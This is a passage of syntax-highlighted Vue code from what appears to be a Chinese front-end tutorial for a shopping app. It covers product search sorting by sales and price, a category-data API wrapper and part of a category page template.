@</span><span style="color: #9CDCFE">click</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #DCDCAA">sortGoods</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'all'</span><span style="color: #D4D4D4">)</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        综合</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"sort-item"</span></span><span class="line"><span style="color: #D4D4D4">        :</span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #D4D4D4">{ </span><span style="color: #C8C8C8">active</span><span style="color: #D4D4D4">: </span><span style="color: #9CDCFE">currentSortType</span><span style="color: #D4D4D4"> === </span><span style="color: #CE9178">'sales'</span><span style="color: #D4D4D4"> }</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">        @</span><span style="color: #9CDCFE">click</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #DCDCAA">sortGoods</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'sales'</span><span style="color: #D4D4D4">)</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        销量</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"sort-item"</span></span><span class="line"><span style="color: #D4D4D4">        :</span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #D4D4D4">{ </span><span style="color: #C8C8C8">active</span><span style="color: #D4D4D4">: </span><span style="color: #9CDCFE">currentSortType</span><span style="color: #D4D4D4"> === </span><span style="color: #CE9178">'price'</span><span style="color: #D4D4D4"> }</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">        @</span><span style="color: #9CDCFE">click</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #DCDCAA">sortGoods</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'price'</span><span style="color: #D4D4D4">)</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        价格</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"goods-list"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #4EC9B0">GoodsItem</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">v-for</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">in</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">productList</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">        :</span><span style="color: #9CDCFE">key</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goods_id</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">        :</span><span style="color: #9CDCFE">goods</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&gt;&lt;/</span><span style="color: #4EC9B0">GoodsItem</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">template</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">script</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">GoodsItem</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"@/components/GoodsItem.vue"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> { </span><span style="color: #9CDCFE">getProducts</span><span style="color: #D4D4D4"> } </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"@/api/product"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">default</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">name:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"SearchIndex"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">components:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">GoodsItem</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">computed:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 从router的query中拿到查询参数</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">queryParam</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// console.log(this.$route.query.search)</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 如果查询参数不存在就返回一个空字符串</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">$route</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">query</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">search</span><span style="color: #D4D4D4"> || </span><span style="color: #CE9178">""</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">async</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">created</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 获取商品列表数据</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">res</span><span style="color: #D4D4D4"> = </span><span style="color: #C586C0">await</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">getProducts</span><span style="color: #D4D4D4">({</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">goodsName:</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">queryParam</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// page: this.page</span></span><span class="line"><span style="color: #D4D4D4">    });</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">productList</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">res</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">data</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">list</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">data</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">res</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">data</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">list</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #DCDCAA">data</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">currentSortType:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"all"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">productList:</span><span style="color: #D4D4D4"> [],</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">page:</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    };</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">methods:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 排序商品</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">async</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">sortGoods</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">sortType</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// console.log(sortType)</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">currentSortType</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">sortType</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">// 更新当前选中的排序类型</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">res</span><span style="color: #D4D4D4"> = </span><span style="color: #C586C0">await</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">getProducts</span><span style="color: #D4D4D4">({</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">goodsName:</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">queryParam</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">sortType:</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">sortType</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      });</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">productList</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">res</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">data</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">list</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">data</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">};</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">script</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">style</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">lang</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"less"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">scoped</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D7BA7D">.search</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">padding-top</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">46px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  ::</span><span style="color: #569CD6">v-deep</span><span style="color: #D4D4D4"> </span><span style="color: #D7BA7D">.van-icon-arrow-left</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#333</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.tool</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">24px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">40px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">line-height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">40px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.sort-btns</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">36px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">line-height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">36px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #D7BA7D">.sort-item</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">text-align</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">center</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">flex</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">16px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #D7BA7D">.active</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#ee0a24</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">// 商品样式</span></span><span class="line"><span style="color: #D7BA7D">.goods-list</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">background-color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#f6f6f6</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">style</span><span style="color: #808080">&gt;</span></span></code></pre></div></div></figure><h4 id="基于分类页面的分类-id-进行渲染"><a class="markdownIt-Anchor" href="#基于分类页面的分类-id-进行渲染"></a> 基于分类页面的分类 id 进行渲染</h4><p>封装请求分类页数据 <code>api/category.js</code></p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">request</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"@/utils/request"</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">// 获取分类页数据</span></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">getCategoryData</span><span style="color: #D4D4D4"> = () </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">request</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">get</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"/category/list"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">};</span></span></code></pre></div></div></figure><p>完成分类页静态结构</p><figure class="shiki vue"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">template</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"category"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">&lt;!-- 分类 --&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-nav-bar</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">title</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"全部分类"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">fixed</span><span style="color: #D4D4D4"> /</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">&lt;!-- 搜索框 --&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-search</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">readonly</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">shape</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"round"</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">background</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"#f1f1f2"</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">placeholder</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"请输入搜索关键词"</span></span><span class="line"><span style="color: #D4D4D4">      @</span><span style="color: #9CDCFE">click</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">$router</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">push</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'/search'</span><span style="color: #D4D4D4">)</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">    /</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">&lt;!-- 分类列表 --&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"list-box"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"left"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-sidebar</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">v-model</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">activeKey</span><span style="color: #D4D4D4">"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-sidebar-item</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #C586C0">v-for</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">index</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">in</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">list</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">            :</span><span style="color: #9CDCFE">key</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">category_id</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">            :</span><span style="color: #9CDCFE">title</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">name</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">            :</span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #D4D4D4">{ </span><span style="color: #C8C8C8">active</span><span style="color: #D4D4D4">: </span><span style="color: #9CDCFE">index</span><span style="color: #D4D4D4"> === </span><span style="color: #9CDCFE">activeKey</span><span style="color: #D4D4D4"> }</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">            @</span><span style="color: #9CDCFE">click</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">activeKey</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">index</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #9CDCFE">href</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"javascript:;"</span></span><span class="line"><span style="color: #D4D4D4">          /</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">van-sidebar</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"right"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span></span><span class="line"><span style="color: #D4D4D4">          @</span><span style="color: #9CDCFE">click</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">$router</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">push</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">`/searchlist?categoryId=</span><span style="color: #569CD6">${</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">category_id</span><span style="color: #569CD6">}</span><span style="color: #CE9178">`</span><span style="color: #D4D4D4">)</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #C586C0">v-for</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">in</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">list</span><span style="color: #D4D4D4">[</span><span style="color: #9CDCFE">activeKey</span><span style="color: #D4D4D4">]?.</span><span style="color: #9CDCFE">children</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">          :</span><span style="color: #9CDCFE">key</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">category_id</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"cate-goods"</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">img</span><span style="color: #D4D4D4"> :</span><span style="color: #9CDCFE">src</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: 